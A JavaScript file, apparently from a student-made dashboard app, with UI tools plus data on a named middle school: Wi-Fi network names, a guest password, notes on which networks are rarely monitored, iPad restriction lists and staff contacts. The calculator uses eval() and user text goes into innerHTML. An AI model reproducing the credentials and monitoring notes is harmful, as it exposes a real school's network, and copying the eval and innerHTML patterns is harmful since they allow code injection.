const rect = canvas.getBoundingClientRect();
const x = e.clientX - rect.left;
const y = e.clientY - rect.top;

ctx.beginPath();
ctx.moveTo(x, y);
}

function draw(e) {
if (!isDrawing || !ctx || !canvas) return;

const rect = canvas.getBoundingClientRect();
const x = e.clientX - rect.left;
const y = e.clientY - rect.top;

ctx.lineWidth = currentThickness;
ctx.lineCap = 'round';
ctx.strokeStyle = currentTool === 'eraser' ? 'white' : currentColor;

ctx.lineTo(x, y);
ctx.stroke();
ctx.beginPath();
ctx.moveTo(x, y);
}

function stopDrawing() {
isDrawing = false;
if (ctx) {
    ctx.beginPath();
}
}

function startSessionTimer() {
setInterval(() => {
const sessionTimeElement = document.getElementById('sessionTime');
const quickbarSessionTimeElement = document.getElementById('quickbarSessionTime');

if (stats.sessionStartTime && sessionTimeElement && quickbarSessionTimeElement) {
    const elapsed = Math.floor((Date.now() - stats.sessionStartTime) / 1000);
    const hours = Math.floor(elapsed / 3600);
    const minutes = Math.floor((elapsed % 3600) / 60);
    const seconds = elapsed % 60;

    const timeString = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

    sessionTimeElement.textContent = timeString;
    quickbarSessionTimeElement.textContent = timeString;
}
}, 1000);
}

function togglePanel(panelId) {
const panel = document.getElementById(panelId);
if (!panel) return;

const isVisible = panel.style.display === 'flex';

panel.style.display = isVisible ? 'none' : 'flex';

if (!isVisible) {
    resetModalContent(panelId);
    stats.panelsOpened++;
    logActivity(`Panel opened: ${panelId}`);
} else {
    stats.panelsClosed++;
    logActivity(`Panel closed: ${panelId}`);
}

updateStats();
}

function closeModal(panelId) {
    const panel = document.getElementById(panelId);
    if (panel) {
        panel.style.display = 'none';
        stats.panelsClosed++;
        logActivity(`Modal closed: ${panelId}`);
        updateStats();
    }
}

function minimizePanel(button) {
const panel = button.closest('.panel');
if (!panel) return;
const content = panel.querySelector('.panel-header').nextElementSibling;

if (content) {
    if (content.style.display === 'none') {
        content.style.display = 'block';
        button.innerHTML = '<i class="fas fa-minus"></i>';
    } else {
        content.style.display = 'none';
        button.innerHTML = '<i class="fas fa-plus"></i>';
    }
}

stats.buttonPresses++;
logActivity('Panel minimized/restored');
}

function closePanel(button) {
const panel = button.closest('.panel');
if (!panel) return;

panel.style.display = 'none';
stats.panelsClosed++;
stats.buttonPresses++;
logActivity(`Panel closed: ${panel.dataset.panel}`);
updateStats();
}

function performSearch() {
const searchBar = document.getElementById('searchBar');
if (!searchBar) return;

const query = searchBar.value.toLowerCase();
if (!query) return;

stats.searchQueries++;
logActivity(`Searched for: ${query}`);

const panels = document.querySelectorAll('.panels-grid > .panel');
let found = false;
panels.forEach(panel => {
const text = panel.textContent.toLowerCase();
const panelTitleElement = panel.querySelector('.panel-title');
const panelTitle = panelTitleElement ? panelTitleElement.textContent.toLowerCase() : '';

if (text.includes(query) || panelTitle.includes(query)) {
panel.style.display = 'block';
panel.style.border = '2px solid var(--accent-color)';
found = true;
setTimeout(() => {
panel.style.border = '1px solid var(--border-color)';
}, 2000);
} else {
}
});

if (!found) {
showNotification("No matching panels found.");
logError("Search failed: No matching panels found for query '" + query + "'.");
}

updateStats();
}

function logActivity(activity) {
const timestamp = new Date().toISOString();
activityLogs.unshift({
timestamp,
activity,
id: Date.now()
});

if (activityLogs.length > 100) {
activityLogs = activityLogs.slice(0, 100);
}

updateActivityLogDisplay();
}

function updateActivityLogDisplay() {
const container = document.getElementById('activityLogsList');
if (!container) return;
container.innerHTML = '';

activityLogs.slice(0, 10).forEach(log => {
const logElement = document.createElement('div');
logElement.className = 'log-entry';
logElement.innerHTML = `
<span>${log.activity}</span>
<span class="log-time">${new Date(log.timestamp).toLocaleTimeString()}</span>
`;
container.appendChild(logElement);
});
}

function logError(message) {
const timestamp = new Date().toISOString();
errorLogs.unshift({
timestamp,
message,
id: Date.now()
});

if (errorLogs.length > 100) {
errorLogs = errorLogs.slice(0, 100);
}
saveErrorLogsToStorage();
updateErrorLogDisplay();
}

function updateErrorLogDisplay() {
const container = document.getElementById('errorLogsList');
if (!container) return;
container.innerHTML = '';

errorLogs.slice(0, 10).forEach(err => {
const errorElement = document.createElement('div');
errorElement.className = 'error-log-entry';
errorElement.innerHTML = `
<span>${err.message}</span>
<span class="error-log-time">${new Date(err.timestamp).toLocaleTimeString()}</span>
`;
container.appendChild(errorElement);
});
}

function clearErrorLogs() {
if (confirm("Are you sure you want to clear all error logs?")) {
errorLogs = [];
saveErrorLogsToStorage();
updateErrorLogDisplay();
showNotification("Error logs cleared.");
logActivity("Error logs cleared.");
}
}

function downloadErrorLogs() {
const data = {
errorLogs: errorLogs,
timestamp: new Date().toISOString()
};
const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
const url = URL.createObjectURL(blob);
const a = document.createElement('a');
a.href = url;
a.download = `error_logs_${new Date().toISOString().split('T')[0]}.json`;
document.body.appendChild(a);
a.click();
document.body.removeChild(a);
URL.revokeObjectURL(url);

showNotification("Error logs downloaded.");
logActivity("Error logs downloaded.");
stats.buttonPresses++;
updateStats();
}

function saveLoginHistoryToStorage() {
localStorage.setItem('loginHistory', JSON.stringify(loginHistory));
}

function loadLoginHistoryFromStorage() {
const storedHistory = localStorage.getItem('loginHistory');
if (storedHistory) {
loginHistory = JSON.parse(storedHistory);
}
updateLoginHistoryDisplay();
}

function saveImportantDatesToStorage() {
localStorage.setItem('importantDates', JSON.stringify(importantDates));
}

function loadImportantDatesFromStorage() {
const storedDates = localStorage.getItem('importantDates');
if (storedDates) {
importantDates = JSON.parse(storedDates);
}
updateImportantDatesDisplay();
}

function saveClickCountToStorage() {
localStorage.setItem('mouseClickCount', clickCount);
}

function loadClickCountFromStorage() {
const storedClickCount = localStorage.getItem('mouseClickCount');
if (storedClickCount !== null) {
clickCount = parseInt(storedClickCount);
}
updateClickCountDisplay();
}

function saveErrorLogsToStorage() {
localStorage.setItem('errorLogs', JSON.stringify(errorLogs));
}

function loadErrorLogsFromStorage() {
const storedErrorLogs = localStorage.getItem('errorLogs');
if (storedErrorLogs) {
errorLogs = JSON.parse(storedErrorLogs);
}
updateErrorLogDisplay();
}

function updateLoginHistoryDisplay() {
const container = document.getElementById('loginHistoryList');
if (!container) return;
container.innerHTML = '';

loginHistory.slice(0, 10).forEach(entry => {
const logElement = document.createElement('div');
const statusClass = entry.success ? 'success' : 'failed';
logElement.className = `login-entry-container ${statusClass}`;
logElement.innerHTML = `
<div class="flex-grow">
<span class="login-entry-status">${entry.success ? 'SUCCESS' : 'FAILED'}:</span>
<span>User "${entry.username || 'unknown'}"</span>
</div>
<span class="login-entry-time">${new Date(entry.time).toLocaleString()}</span>
`;
container.appendChild(logElement);
});
}

function addImportantDate() {
const dateInput = document.getElementById('importantDateDay');
const timeInput = document.getElementById('importantDateTime');
const eventInput = document.getElementById('importantDateEvent');

if (!dateInput || !timeInput || !eventInput) return;

const dateValue = dateInput.value;
const timeValue = timeInput.value;
const eventValue = eventInput.value;

if (dateValue && timeValue && eventValue) {
const fullDate = `${dateValue}T${timeValue}`;
const newDate = {
id: Date.now(),
datetime: new Date(fullDate).toISOString(),
event: eventValue
};
importantDates.unshift(newDate);
importantDates.sort((a, b) => new Date(a.datetime) - new Date(b.datetime));
saveImportantDatesToStorage();
updateImportantDatesDisplay();
logActivity(`Added important date: ${eventValue} on ${new Date(fullDate).toLocaleString()}`);
showNotification("Important date added!");

dateInput.value = new Date().toISOString().split('T')[0];
timeInput.value = new Date().toTimeString().slice(0,5);
eventInput.value = '';
} else {
showError("Please fill in all important date fields.");
}
}

function clearImportantDates() {
if (confirm("Are you sure you want to clear all important dates?")) {
importantDates = [];
saveImportantDatesToStorage();
updateImportantDatesDisplay();
logActivity("All important dates cleared.");
showNotification("All important dates cleared.");
}
}

function updateImportantDatesDisplay() {
const container = document.getElementById('importantDatesList');
if (!container) return;
container.innerHTML = '';

importantDates.forEach(dateEntry => {
const entryElement = document.createElement('div');
entryElement.className = 'important-date-item';
const formattedDate = new Date(dateEntry.datetime).toLocaleString();
entryElement.innerHTML = `
<div class="date-time">${formattedDate}</div>
<div class="event-description">${dateEntry.event}</div>
`;
container.appendChild(entryElement);
});
}

function incrementClickCounter() {
clickCount++;
updateClickCountDisplay();
saveClickCountToStorage();
logActivity('Mouse click incremented');
}

function resetClickCounter() {
if (confirm("Are you sure you want to reset the click counter?")) {
clickCount = 0;
updateClickCountDisplay();
saveClickCountToStorage();
logActivity('Mouse clicker reset');
showNotification("Click counter reset!");
}
}

function updateClickCountDisplay() {
const display = document.getElementById('clickCountDisplay');
if (display) {
display.textContent = clickCount;
}
}

function updateStats() {
const buttonPressesElem = document.getElementById('buttonPresses');
const toggleSwitchesElem = document.getElementById('toggleSwitches');
const panelsOpenedElem = document.getElementById('panelsOpened');
const panelsClosedElem = document.getElementById('panelsClosed');
const searchQueriesElem = document.getElementById('searchQueries');

if (buttonPressesElem) buttonPressesElem.textContent = stats.buttonPresses;
if (toggleSwitchesElem) toggleSwitchesElem.textContent = stats.toggleSwitches;
if (panelsOpenedElem) panelsOpenedElem.textContent = stats.panelsOpened;
if (panelsClosedElem) panelsClosedElem.textContent = stats.panelsClosed;
if (searchQueriesElem) searchQueriesElem.textContent = stats.searchQueries;
}

function downloadActivityLogs() {
const data = {
activityLogs,
loginHistory,
importantDates,
mouseClickCount: clickCount,
errorLogs,
stats,
timestamp: new Date().toISOString()
};

const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
const url = URL.createObjectURL(blob);
const a = document.createElement('a');
a.href = url;
a.download = `activity_logs_${new Date().toISOString().split('T')[0]}.json`;
document.body.appendChild(a);
a.click();
document.body.removeChild(a);
URL.revokeObjectURL(url);

stats.buttonPresses++;
logActivity('Activity logs downloaded');
showNotification('Activity logs downloaded!');
updateStats();
}

function showStats() {
togglePanel('statsPanel');

const ctx = document.getElementById('statsChart')?.getContext('2d');
if (ctx) {
    if (Chart.getChart(ctx)) {
        Chart.getChart(ctx).destroy();
    }
    new Chart(ctx, {
        type: 'doughnut',
        data: {
            labels: ['Button Presses', 'Toggle Switches', 'Panels Opened', 'Panels Closed', 'Search Queries', 'Mouse Clicks'],
            datasets: [{
                data: [stats.buttonPresses, stats.toggleSwitches, stats.panelsOpened, stats.panelsClosed, stats.searchQueries, clickCount],
                backgroundColor: ['#ff4500', '#ff6b35', '#00ff41', '#ffaa00', '#0066cc', '#8800cc']
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: {
                legend: {
                    labels: {
                        color: getComputedStyle(document.documentElement).getPropertyValue('--text-primary')
                    }
                }
            }
        }
    });
}
}

function startStopwatch() {
if (!isStopwatchRunning) {
isStopwatchRunning = true;
stopwatchInterval = setInterval(() => {
stopwatchTime++;
updateStopwatchDisplay();
}, 10);
logActivity('Stopwatch started');
}
}

function pauseStopwatch() {
if (isStopwatchRunning) {
isStopwatchRunning = false;
clearInterval(stopwatchInterval);
logActivity('Stopwatch paused');
}
}

function resetStopwatch() {
isStopwatchRunning = false;
clearInterval(stopwatchInterval);
stopwatchTime = 0;
updateStopwatchDisplay();
logActivity('Stopwatch reset');
}

function updateStopwatchDisplay() {
const stopwatchDisplay = document.getElementById('stopwatchDisplay');
if (!stopwatchDisplay) return;

const totalSeconds = Math.floor(stopwatchTime / 100);
const hours = Math.floor(totalSeconds / 3600);
const minutes = Math.floor((totalSeconds % 3600) / 60);
const seconds = totalSeconds % 60;
const centiseconds = stopwatchTime % 100;

stopwatchDisplay.textContent =
`${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}.${centiseconds.toString().padStart(2, '0')}`;
}

function startTimer() {
const timerHoursInput = document.getElementById('timerHours');
const timerMinutesInput = document.getElementById('timerMinutes');
const timerSecondsInput = document.getElementById('timerSeconds');

if (!timerHoursInput || !timerMinutesInput || !timerSecondsInput) return;

const hours = parseInt(timerHoursInput.value) || 0;
const minutes = parseInt(timerMinutesInput.value) || 0;
const seconds = parseInt(timerSecondsInput.value) || 0;

timerTime = (hours * 3600) + (minutes * 60) + seconds;

if (timerTime > 0 && !isTimerRunning) {
isTimerRunning = true;
timerInterval = setInterval(() => {
timerTime--;
updateTimerDisplay();

if (timerTime <= 0) {
pauseTimer();
showNotification('Timer finished!');
logActivity('Timer completed');
}
}, 1000);
logActivity('Timer started');
}
}

function pauseTimer() {
isTimerRunning = false;
clearInterval(timerInterval);
logActivity('Timer paused');
}

function resetTimer() {
isTimerRunning = false;
clearInterval(timerInterval);
timerTime = 0;
updateTimerDisplay();
logActivity('Timer reset');
}

function updateTimerDisplay() {
const timerDisplay = document.getElementById('timerDisplay');
if (!timerDisplay) return;

const hours = Math.floor(timerTime / 3600);
const minutes = Math.floor((timerTime % 3600) / 60);
const seconds = timerTime % 60;

timerDisplay.textContent =
`${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

function addReminder() {
const textInput = document.getElementById('reminderText');
const timeInput = document.getElementById('reminderTime');
const remindersList = document.getElementById('remindersList');

if (!textInput || !timeInput || !remindersList) return;

const text = textInput.value;
const time = timeInput.value;

if (text && time) {
const reminderTime = new Date(time);
const now = new Date();

if (reminderTime > now) {
const timeout = reminderTime.getTime() - now.getTime();

setTimeout(() => {
showNotification(`Reminder: ${text}`);
}, timeout);

const reminderElement = document.createElement('div');
reminderElement.className = 'p-2 bg-gray-700 rounded';
reminderElement.innerHTML = `
<div class="font-semibold">${text}</div>
<div class="text-sm text-gray-400">${reminderTime.toLocaleString()}</div>
`;

remindersList.appendChild(reminderElement);

textInput.value = '';
timeInput.value = '';

logActivity(`Reminder set: ${text}`);
}
}
}

function selectTool(button, tool) {
document.querySelectorAll('.tool-btn[data-tool]').forEach(btn => btn.classList.remove('active'));
button.classList.add('active');
currentTool = tool;

const canvasElement = document.getElementById('drawingCanvas');
if (canvasElement) {
    canvasElement.style.cursor = tool === 'eraser' ? 'crosshair' : 'crosshair';
}

logActivity(`Drawing tool changed to: ${tool}`);
}

function clearCanvas() {
if (ctx) {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    logActivity('Canvas cleared');
}
}

function saveCanvas() {
if (!canvas) return;

const link = document.createElement('a');
link.download = `drawing_${Date.now()}.png`;
link.href = canvas.toDataURL();
link.click();
logActivity('Canvas saved');
}

function appendToCalc(value) {
const display = document.getElementById('calcDisplay');
if (!display) return;

if (display.textContent === '0' && value !== '.') {
display.textContent = value;
} else {
display.textContent += value;
}
}

function clearCalc() {
const display = document.getElementById('calcDisplay');
if (display) display.textContent = '0';
}

function deleteLast() {
const display = document.getElementById('calcDisplay');
if (!display) return;

if (display.textContent.length > 1) {
display.textContent = display.textContent.slice(0, -1);
} else {
display.textContent = '0';
}
}

function calculateResult() {
const display = document.getElementById('calcDisplay');
if (!display) return;

try {
const result = eval(display.textContent.replace('×', '*').replace('÷', '/'));
display.textContent = result;
logActivity(`Calculation performed: ${display.textContent} = ${result}`);
} catch (error) {
display.textContent = 'Error';
}
}

function updateConversionUnits() {
const typeSelect = document.getElementById('conversionType');
const fromUnitSelect = document.getElementById('fromUnit');
const toUnitSelect = document.getElementById('toUnit');

if (!typeSelect || !fromUnitSelect || !toUnitSelect) return;

const type = typeSelect.value;

const units = {
length: [
{ value: 'm', text: 'Meters' },
{ value: 'km', text: 'Kilometers' },
{ value: 'cm', text: 'Centimeters' },
{ value: 'mm', text: 'Millimeters' },
{ value: 'in', text: 'Inches' },
{ value: 'ft', text: 'Feet' }
],
weight: [
{ value: 'kg', text: 'Kilograms' },
{ value: 'g', text: 'Grams' },
{ value: 'lb', text: 'Pounds' },
{ value: 'oz', text: 'Ounces' }
],
temperature: [
{ value: 'c', text: 'Celsius' },
{ value: 'f', text: 'Fahrenheit' },
{ value: 'k', text: 'Kelvin' }
],
volume: [
{ value: 'l', text: 'Liters' },
{ value: 'ml', text: 'Milliliters' },
{ value: 'gal', text: 'Gallons' },
{ value: 'qt', text: 'Quarts' }
]
};

fromUnitSelect.innerHTML = '';
toUnitSelect.innerHTML = '';

units[type].forEach(unit => {
fromUnitSelect.innerHTML += `<option value="${unit.value}">${unit.text}</option>`;
toUnitSelect.innerHTML += `<option value="${unit.value}">${unit.text}</option>`;
});
convertUnits();
}

function convertUnits() {
const fromValueInput = document.getElementById('fromValue');
const fromUnitSelect = document.getElementById('fromUnit');
const toUnitSelect = document.getElementById('toUnit');
const typeSelect = document.getElementById('conversionType');
const toValueInput = document.getElementById('toValue');

if (!fromValueInput || !fromUnitSelect || !toUnitSelect || !typeSelect || !toValueInput) return;

const fromValue = parseFloat(fromValueInput.value);
const fromUnit = fromUnitSelect.value;
const toUnit = toUnitSelect.value;
const type = typeSelect.value;

if (isNaN(fromValue)) {
toValueInput.value = '';
return;
}

let result = fromValue;

const factors = {
length: {
'm': 1, 'km': 1000, 'cm': 0.01, 'mm': 0.001, 'in': 0.0254, 'ft': 0.3048
},
weight: {
'kg': 1000, 'g': 1, 'lb': 453.592, 'oz': 28.3495
},
temperature: {},
volume: {
'l': 1, 'ml': 0.001, 'gal': 3.78541, 'qt': 0.946353
}
};

if (type === 'length') {
result = fromValue * factors.length[fromUnit] / factors.length[toUnit];
} else if (type === 'weight') {
result = fromValue * factors.weight[fromUnit] / factors.weight[toUnit];
} else if (type === 'volume') {
result = fromValue * factors.volume[fromUnit] / factors.volume[toUnit];
} else if (type === 'temperature') {
let tempInC;
if (fromUnit === 'c') tempInC = fromValue;
else if (fromUnit === 'f') tempInC = (fromValue - 32) * 5/9;
else if (fromUnit === 'k') tempInC = fromValue - 273.15;

if (toUnit === 'c') result = tempInC;
else if (toUnit === 'f') result = (tempInC * 9/5) + 32;
else if (toUnit === 'k') result = tempInC + 273.15;
}

toValueInput.value = result.toFixed(6);
logActivity(`Unit converted: ${fromValue} ${fromUnit} to ${result.toFixed(6)} ${toUnit}`);
}

function toggleTheme() {
document.body.classList.toggle('light-theme');
isLightMode = document.body.classList.contains('light-theme');
logActivity('Theme toggled to ' + (isLightMode ? 'Light Mode' : 'Dark Mode'));
updateStatsChartTheme();
}

function applyAccentTheme(theme, event) {
const root = document.documentElement;
if (!root) return;

const themes = {
orange: { primary: '#ff4500', secondary: '#ff6b35' },
blue: { primary: '#0066cc', secondary: '#004499' },
green: { primary: '#00cc44', secondary: '#009933' },
red: { primary: '#cc0044', secondary: '#990033' },
purple: { primary: '#8800cc', secondary: '#6600aa' },
amber: { primary: '#ffaa00', secondary: '#ff8800' },
teal: { primary: '#00aaaa', secondary: '#008888' },
pink: { primary: '#ff0088', secondary: '#cc0066' }
};

if (themes[theme]) {
root.style.setProperty('--accent-color', themes[theme].primary);
root.style.setProperty('--accent-secondary', themes[theme].secondary);

if (document.body.classList.contains('light-theme')) {
root.style.setProperty('--success-color', themes[theme].primary);
root.style.setProperty('--error-color', themes[theme].primary);
root.style.setProperty('--warning-color', themes[theme].primary);
} else {
root.style.setProperty('--success-color', '#00ff41');
root.style.setProperty('--error-color', '#ff0040');
root.style.setProperty('--warning-color', '#ffaa00');
}

document.querySelectorAll('.theme-option').forEach(opt => opt.classList.remove('active'));
if (event.target) event.target.classList.add('active');

logActivity(`Accent theme changed to: ${theme}`);
updateStatsChartTheme();
}
}

function getContrastColor(hexcolor) {
if (!hexcolor) return '#FFFFFF';
const r = parseInt(hexcolor.substr(1, 2), 16);
const g = parseInt(hexcolor.substr(3, 2), 16);
const b = parseInt(hexcolor.substr(5, 2), 16);
const y = (r * 299 + g * 587 + b * 114) / 1000;
return (y >= 128) ? '#000000' : '#FFFFFF';
}

function updateStatsChartTheme() {
const ctx = document.getElementById('statsChart')?.getContext('2d');
if (ctx) {
    const chart = Chart.getChart(ctx);
    if (chart) {
        chart.options.plugins.legend.labels.color = getComputedStyle(document.documentElement).getPropertyValue('--text-primary');
        chart.update();
    }
}
}

function toggleSetting(toggle) {
if (!toggle) return;
toggle.classList.toggle('active');
stats.toggleSwitches++;
if (toggle.previousElementSibling) {
    logActivity(`Setting toggled: ${toggle.previousElementSibling.textContent}`);
}
updateStats();
}

function refreshFact() {
const facts = [
"Honey never spoils. Archaeologists have found pots of honey in ancient Egyptian tombs that are over 3000 years old and still perfectly edible.",
"A group of flamingos is called a 'flamboyance'.",
"Bananas are berries, but strawberries aren't.",
"The shortest war in history lasted only 38-45 minutes.",
"A single cloud can weigh more than a million pounds."
];
const randomFactElement = document.getElementById('randomFact');
if (randomFactElement) {
    randomFactElement.textContent = facts[Math.floor(Math.random() * facts.length)];
    logActivity('Random fact refreshed');
}
}

function refreshQuote() {
const quotes = [
"\"The only way to do great work is to love what you do.\" - Steve Jobs",
"\"Innovation distinguishes between a leader and a follower.\" - Steve Jobs",
"\"Life is what happens to you while you're busy making other plans.\" - John Lennon",
"\"The future belongs to those who believe in the beauty of their dreams.\" - Eleanor Roosevelt",
"\"It is during our darkest moments that we must focus to see the light.\" - Aristotle"
];
const dailyQuoteElement = document.getElementById('dailyQuote');
if (dailyQuoteElement) {
    dailyQuoteElement.textContent = quotes[Math.floor(Math.random() * quotes.length)];
    logActivity('Daily quote refreshed');
}
}

function clearNotifications() {
const notificationsList = document.getElementById('notificationsList');
if (notificationsList) {
    notificationsList.innerHTML = '';
    logActivity('Notifications cleared');
}
}

function clearActivityLogs() {
if (confirm("Are you sure you want to clear all activity logs?")) {
activityLogs = [];
updateActivityLogDisplay();
logActivity('Activity logs cleared');
}
}

function saveTextNotes() {
const textNotes = document.getElementById('textNotes');
if (textNotes) {
    localStorage.setItem('textNotes', textNotes.value);
    showNotification('Notes saved successfully');
    logActivity('Text notes saved');
}
}

function clearTextNotes() {
const textNotes = document.getElementById('textNotes');
if (textNotes && confirm("Are you sure you want to clear your text notes?")) {
    textNotes.value = '';
    logActivity('Text notes cleared');
}
}

function showNotification(message) {
const notification = document.createElement('div');
notification.className = 'notification';
notification.innerHTML = `<i class="fas fa-info-circle"></i> ${message}`;
document.body.appendChild(notification);

setTimeout(() => {
notification.remove();
}, 3000);
}

function logout() {
if (confirm('Are you sure you want to logout?')) {
logActivity('System logged out');
location.reload();
}
}

function takeScreenshot() {
html2canvas(document.body).then(function(canvas) {
const link = document.createElement('a');
link.download = `screenshot_${Date.now()}.png`;
link.href = canvas.toDataURL('image/png');
document.body.appendChild(link);
link.click();
document.body.removeChild(link);
showNotification('Screenshot saved!');
logActivity('Screenshot taken');
stats.buttonPresses++;
updateStats();
});
}

function togglePanelsGridVisibility() {
const panelsGrid = document.getElementById('panelsGrid');
if (!panelsGrid) return;

if (panelsGrid.style.display === 'none' || panelsGrid.style.opacity === '0') {
panelsGrid.style.display = 'grid';
panelsGrid.style.opacity = '1';
showNotification('Sections are now visible.');
logActivity('Sections toggled ON');
} else {
panelsGrid.style.opacity = '0';
setTimeout(() => {
panelsGrid.style.display = 'none';
}, 300);
showNotification('Sections are now hidden.');
logActivity('Sections toggled OFF');
}
stats.buttonPresses++;
updateStats();
}

async function restartSystem() {
if (confirm('Are you sure you want to restart the system? You will be logged out and all unsaved data will be lost.')) {
logActivity('System restarted');
const embeds = createEmbedsFromFields(
"⚠️ System Restart Initiated", 0xFFFF00, [
{ name: "Triggered By", value: currentUser || "Unknown User (pre-login or guest)", inline: true },
{ name: "Location", value: "Dashboard", inline: true },
{ name: "Time", value: new Date().toLocaleString(), inline: false }
]
);
await sendWebhook(webhooks.resetInformation, embeds);
localStorage.clear();
location.reload();
}
}

const wifiNetworks = {
    "Middletown_Core": {
        "Network Name": "Middletown_Core",
        "Wifi Level": "Main",
        "Wifi Security Type": "WPA3 Enterprise",
        "Wifi Encryption Type": "High",
        "Hidden?": "No",
        "Monitored?": "Yes",
        "Username": "Unknown",
        "Password": "Unknown"
    },
    "Mtown_Core": {
        "Network Name": "Mtown_Core",
        "Wifi Level": "Main Backup",
        "Wifi Security Type": "WPA3 Enterprise",
        "Wifi Encryption Type": "High",
        "Hidden?": "Yes",
        "Monitored?": "Unknown",
        "Username": "Unknown",
        "Password": "Unknown"
    },
    "Mtown Guest": {
        "Network Name": "Mtown Guest",
        "Wifi Level": "Guest Main",
        "Wifi Security Type": "WPA3 Enterprise",
        "Wifi Encryption Type": "Medium",
        "Hidden?": "No",
        "Monitored?": "Rare",
        "Username": "msguest",
        "Password": "M@ms2021#"
    },
    "Radius Test": {
        "Network Name": "Radius Test",
        "Wifi Level": "Testing Main",
        "Wifi Security Type": "WPA3 Enterprise",
        "Wifi Encryption Type": "Low",
        "Hidden?": "No",
        "Monitored?": "Rarely",
        "Username": "msguest",
        "Password": "M@ms2021#"
    }
};

const iPadRestrictionsContent = {
    restrictions: `Shared Streams not allowed
USB accessories while locked allowed
Wi-Fi power is forced on
Apple personalized advertising not allowed
iCloud Photos not allowed
Installing configuration profiles not allowed
FaceTime not allowed
Password Sharing is not allowed
Changing app cellular data usage not allowed
Explicit content not allowed
AirDrop not allowed
Siri while locked not allowed
Game Center not allowed
Siri suggestions not allowed
eSIM modification not allowed
Touch ID unlock not allowed
Bluetooth forced on
Classroom request permission to leave classes enforced
Proximity password requests not allowed
Device name modification not allowed
Changing cellular plan not allowed
Siri uncurated content enforced
Proximity Setup to a new device is not allowed
Authentication before Auto Filling passwords enforced
In-app purchase not allowed
TV show ratings enforced
App ratings enforced
VPN creation not allowed
Entering iTunes password enforced
Siri profanity filter enforced
Erase content and settings not allowed
Delayed Software Updates enforced
Autonomous Single App Mode permissions added
iTunes Store not allowed
Requests to track from apps not allowed
Classroom unprompted app and device lock enforced
iMessage not allowed
Installing apps not allowed
Classroom automatic class joining enforced
Apple Music service not allowed
Delay period for Delayed Software Updates is 30 days
Passbook not allowed
Paired Apple Watch not allowed
Erotica in Apple Books not allowed
Diagnostic submission modification not allowed
Prohibited application list added
Voice dialing while locked not allowed
Removing system apps not allowed
iTunes Radio not allowed
Movie ratings enforced
Automatic date & time enforced`,
    bypasses: `No specific bypasses are officially provided or guaranteed for these restrictions. Attempting to bypass school-imposed restrictions may violate school policy and terms of use. Information on potential bypasses is often context-specific and changes frequently. Always consult official IT support for clarity.`
};

const schoolInfoDetails = `School Name: Middletown Area Middle School
School Address: 215 Oberlin RoadMiddletown, PA 17057
School Phone: 717-930-0739
School Fax: 717-944-0591

School Principal: Dr. Shannon L. Wevodau
Principal's Phone: 717-930-0739
Principal's Email: swevodau@raiderweb.org

Assistant Principal: Mr. Michael DeFilippo
Assistant Principal's Phone: 717-930-0739
Assistant Principal's Email: mdefilippo@raiderweb.org`;

const keyboardShortcutsContent = `System Shortcuts:
• Access Spotlight Search: Press Command (⌘) + Space bar.
• Return to the Home screen: Press Command (⌘) + H.
• Show the Dock: Press Command (⌘) + Option (⌥) + D.
• Show the App Library: Press Shift (⇧) + Globe + A.
• Open Quick Note: Press Globe + Q.
• Open Siri: Press Globe + S.
• Open Control Center: Press Globe + C.
• Open Notification Center: Press Globe + N.
• Show all windows: Press Globe + Down Arrow.
• Open the App Switcher: Press Globe + Up Arrow.

Multitasking Shortcuts:
• Switch to the last active app: Press Command (⌘) + Tab.
• View all active apps: Press and hold Command (⌘) + Tab.
• Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.
• Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.
• Open Slide Over: Press Globe + Backslash.
• Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.

Safari and App-Specific Shortcuts:
• Take a full-screen screenshot: Press Command (⌘) + Shift + 3.
• Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.
• Open a new private tab: Press Command (⌘) + Shift + N.
• Open a new tab: Press Command (⌘) + T or Command (⌘) + N.
• Close the current tab: Press Command (⌘) + W.
• Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.
• Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.
• Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.
• Reopen the last closed tab: Press Shift + Command (⌘) + T.
• Go to a specific tab (1-8): Press Command (⌘) + (1-8).
• Go to the last tab: Press Command (⌘) + 9.
• Open the Tab Grid: Press Shift + Command (⌘) + .
• Open a new Incognito tab: Press Shift + Command (⌘) + N.
• Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.
• Open a new window: Press Option (⌥) + Command (⌘) + N.

General Navigation and Text Editing:
• Navigate between elements in an app (like fields, lists, buttons): Press Tab.
• Select all text: Press Command (⌘) + A.
• Copy selected text: Press Command (⌘) + C.
• Cut selected text: Press Command (⌘) + X.
• Paste copied text: Press Command (⌘) + V.
• Undo the last action: Press Command (⌘) + Z.
• Redo the last undone action: Press Command (⌘) + Shift + Z.
• Jump to the top of a page: Press Command (⌘) + Up Arrow.
• Jump to the bottom of a page: Press Command (⌘) + Down Arrow.
• Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.`;

function getColorClass(value) {
    const lowerValue = String(value).toLowerCase();
    if (lowerValue === 'high' || lowerValue === 'yes') return 'text-color-high';
    if (lowerValue === 'medium' || lowerValue === 'rare' || lowerValue === 'rarely') return 'text-color-medium';
    if (lowerValue === 'low' || lowerValue === 'no' || lowerValue === 'dangerous') return 'text-color-low';
    if (lowerValue === 'unknown') return 'text-color-unknown';
    return '';
}

function resetModalContent(modalId) {
    const modal = document.getElementById(modalId);
    if (!modal) return;

    const contentDisplay = modal.querySelector('.formatted-info-card');
    const optionsContainer = modal.querySelector('div[id$="OptionsContainer"]');
